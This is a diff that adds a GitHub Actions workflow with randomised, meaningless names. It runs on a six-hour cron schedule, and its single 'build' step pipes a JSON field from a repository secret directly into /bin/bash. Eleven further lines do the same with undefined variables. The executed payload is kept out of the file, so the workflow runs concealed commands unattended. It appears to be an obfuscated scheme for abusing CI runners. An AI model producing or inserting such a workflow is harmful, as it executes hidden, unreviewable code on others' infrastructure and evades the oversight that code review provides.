@@ -1,0 +1,30 @@
+name: caravanallow
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: caravanallow
+        env:
+          lgeg63019: ${{ secrets.lgeg63019 }}
+        run: |
+          echo $lgeg63019 | jq -r .ls80 | /bin/bash
+          echo $xnhk11 | jq -r .rgkr0105 | /bin/bash
+          echo $v4 | jq -r .xss0 | /bin/bash
+          echo $c3 | jq -r .gki1729 | /bin/bash
+          echo $otgnl9 | jq -r .y23225 | /bin/bash
+          echo $dmno9 | jq -r .xa52 | /bin/bash
+          echo $fr0 | jq -r .kwx4 | /bin/bash
+          echo $jnpf09351 | jq -r .lixdl34 | /bin/bash
+          echo $iw3 | jq -r .dkei9301 | /bin/bash
+          echo $r579 | jq -r .zjt3233 | /bin/bash
+          echo $u88597 | jq -r .u9498 | /bin/bash
+          echo $olxpf7 | jq -r .yhhmf3710 | /bin/bash
+
